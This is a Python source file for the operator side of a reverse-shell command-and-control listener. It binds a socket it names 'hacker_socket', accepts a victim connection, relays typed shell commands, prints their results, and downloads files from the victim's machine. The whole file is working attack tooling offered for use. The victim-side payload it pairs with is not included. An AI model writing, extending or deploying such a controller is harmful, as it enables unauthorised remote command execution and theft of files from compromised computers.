import socket
import sys
import os
import subprocess

IDENTIFIER = "<END_OF_COMMAND_RESULT>"
FILE_IDENTIFIER = "<END_OF_FILE>"

def receive_file(file_path, client_socket):
    """Receive a file from the client socket and save it locally."""
    try:
        buffer = b""  # Buffer for incoming data
        with open(file_path, "wb") as file:
            print("Downloading file... ", end="")
            sys.stdout.flush()

            while True:
                chunk = client_socket.recv(1024)
                if not chunk:
                    raise Exception("Connection closed unexpectedly.")
                buffer += chunk

                # Check if the end marker is in the buffer
                if FILE_IDENTIFIER.encode() in buffer:
                    # Split the buffer at the end marker
                    file_data, buffer = buffer.split(FILE_IDENTIFIER.encode(), 1)
                    file.write(file_data)
                    break
                else:
                    file.write(buffer)
                    buffer = b""

            print(f"\nFile saved as {file_path}")
    except Exception as e:
        print(f"Error receiving file: {e}")

def open_file(file_path):
    """Attempt to open the received file with the default application."""
    try:
        if sys.platform == "win32":
            os.startfile(file_path)
        elif sys.platform == "darwin":  # macOS
            subprocess.run(["open", file_path], check=True)
        else:  # Linux or other Unix-like systems
            subprocess.run(["xdg-open", file_path], check=True)
        print(f"Opened file: {file_path}")
    except Exception as e:
        print(f"Error opening file: {e}")

def handle_connection(hacker_socket):
    """Handles the connection with the client and processes commands."""
    client_socket, client_address = hacker_socket.accept()
    print("Connection established with", client_address)

    try:
        while True:
            # Receive the command from the user and send it to the client
            command = input("Enter the command: ").strip()
            if not command:
                continue

            client_socket.send(command.encode())

            if command == "stop":
                print("Stopping connection...")
                client_socket.close()
                break
            elif command.startswith("download"):
                # Ensure the file name is provided
                parts = command.split(" ", 1)
                if len(parts) < 2 or not parts[1].strip():
                    print("Please specify a file name to save the download.")
                    continue
                file_name = parts[1].strip()
                receive_file(file_name, client_socket)
            elif command.startswith("open"):
                parts = command.split(" ", 1)
                if len(parts) < 2 or not parts[1].strip():
                    print("Please specify the file name to open.")
                    continue
                file_name = parts[1].strip()
                if os.path.exists(file_name):
                    open_file(file_name)
                else:
                    print(f"File not found: {file_name}")
            else:
                # Receiving the command result
                full_command_result = b""
                while True:
                    chunk = client_socket.recv(1024)
                    if chunk.endswith(IDENTIFIER.encode()):
                        full_command_result += chunk[:-len(IDENTIFIER)]
                        break
                    full_command_result += chunk

                print(full_command_result.decode("utf-8"))

    except KeyboardInterrupt:
        print("Interrupted by user.")
        client_socket.close()
    except Exception as e:
        print(f"Error: {e}")
    finally:
        # Ensure the socket is closed properly
        hacker_socket.close()

if __name__ == "__main__":
    try:
        hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        IP = "127.0.0.1"  # Localhost for testing
        Port = 8008
        hacker_socket.bind((IP, Port))
        hacker_socket.listen(1)
        print("Listening for incoming connection requests...")

        handle_connection(hacker_socket)

    except Exception as e:
        print(f"Error setting up the server: {e}")
    finally:
        if 'hacker_socket' in locals():
            hacker_socket.close()
